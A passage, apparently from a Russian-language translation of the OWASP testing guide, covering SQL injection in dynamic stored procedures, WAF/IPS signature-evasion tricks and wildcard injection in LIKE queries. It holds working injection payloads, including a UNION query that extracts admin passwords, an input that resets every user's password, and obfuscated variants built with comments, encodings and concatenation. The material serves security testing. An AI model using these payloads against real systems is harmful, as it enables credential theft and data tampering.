Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Пользовательский ввод:

```sql
anyusername or 1=1'
anypassword
```

Данная процедура не очищает входные данные, что позволяет возвращенному результату подтвердить существование записи с такими параметрами.

> Этот пример может показаться маловероятным из-за использования динамического SQL для входа пользователя, однако представьте динамический запрос отчета, в котором пользователь выбирает столбцы для просмотра. В подобном сценарии пользователь может внедрить вредоносный код и скомпрометировать данные.

Рассмотрим следующую хранимую процедуру SQL Server:

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Пользовательский ввод:

```sql
1 from users; update users set password = 'password'; select *
```

Это приведет к формированию отчета и одновременному обновлению паролей всех пользователей.

#### Автоматизированная эксплуатация

Большинство рассмотренных ситуаций и техник можно автоматизировать с помощью специализированных инструментов. В данном руководстве тестировщик найдет сведения о проведении автоматизированного аудита с помощью [SQLMap](https://sqlmap.org/).

### Техники обхода сигнатур SQL-инъекций

Данные техники применяются для обхода средств защиты, таких как межсетевые экраны веб-приложений (WAF) или системы предотвращения вторжений (Intrusion Prevention Systems, IPS). См. также [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### Пробельные символы

Удаление пробелов или добавление дополнительных пробелов, не влияющих на выполнение SQL-инструкции. Например:

```sql
or 'a'='a'

or 'a'  =    'a'
```

Добавление специальных символов, таких как перевод строки или табуляция, не меняющих логику выполнения SQL-инструкции. Например:

```sql
or
'a'=
        'a'
```

#### Нулевые байты

Использование нулевого байта (%00) перед любыми символами, которые блокируются фильтром.

Например, если атакующий внедряет следующий SQL:

`' UNION SELECT password FROM Users WHERE username='admin'--`

с добавлением Null-байта запрос примет вид:

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### SQL-комментарии

Добавление встроенных SQL-комментариев также может помочь сохранить валидность SQL-инструкции и обойти фильтр SQL-инъекций. Возьмем в качестве примера следующую SQL-инъекцию:

`' UNION SELECT password FROM Users WHERE name='admin'--`

С добавлением встроенных комментариев SQL она примет вид:

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL-кодирование

Использование [онлайн-сервиса URL-кодирования](https://meyerweb.com/eric/tools/dencoder/) для кодирования SQL-инструкции:

`' UNION SELECT password FROM Users WHERE name='admin'--`

URL-кодированное представление SQL-инъекции примет вид:

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Кодировка символов

Функция Char() может использоваться для замены символов латиницы. Например, char(114,111,111,116) означает root:

`' UNION SELECT password FROM Users WHERE name='root'--`

С применением Char() инструкция SQL-инъекции примет вид:

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### Конкатенация строк

Конкатенация разбивает ключевые слова SQL и позволяет обходить фильтры. Синтаксис конкатенации зависит от движка базы данных. Рассмотрим в качестве примера движок MS SQL:

`select 1`

Простая инструкция SQL может быть преобразована следующим образом с помощью конкатенации:

`EXEC('SEL' + 'ECT 1')`

#### Шестнадцатеричное кодирование

Техника шестнадцатеричного кодирования использует Hex-кодирование для замены исходных символов SQL-инструкции. Например, `root` может быть представлено как `726F6F74`:

`Select user from users where name = 'root'`

SQL-инструкция с использованием значения HEX примет вид:

`Select user from users where name = 726F6F74`

или

`Select user from users where name = unhex('726F6F74')`

#### Объявление переменных

Объявление инструкции SQL-инъекции в переменной с последующим ее выполнением.

Например, для приведенной ниже SQL-инъекции:

`Union Select password`

Объявим SQL-инструкцию в переменной `SQLivar`:

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Альтернативное выражение для 'or 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### Инъекция подстановочных символов SQL (SQL Wildcard Injection)

Большинство диалектов SQL поддерживают как подстановочные знаки одного символа (обычно "`?`" или "`_`"), так и подстановочные знаки нескольких символов (обычно "`%`" или "`*`"), которые могут использоваться в запросах с оператором `LIKE`. Даже когда для защиты от атак SQL Injection применяются надлежащие средства контроля (такие как параметризованные запросы или подготовленные выражения `[prepared statements]`), сохраняется возможность внедрения подстановочных символов (wildcards) в логику запросов.

Например, если веб-приложение позволяет пользователям вводить промокод на скидку в процессе оформления заказа и проверяет его наличие в базе с помощью запроса вида `SELECT * FROM discount_codes WHERE code LIKE ':code'`, ввод значения `%` (которое будет подставлено вместо параметра `:code`) приведет к совпадению со всеми существующими кодами скидок.

Данная техника также может использоваться для подбора точных кодов скидок через последовательное уточнение запросов (таких как `a%`, `b%`, `ba%` и т. д.).
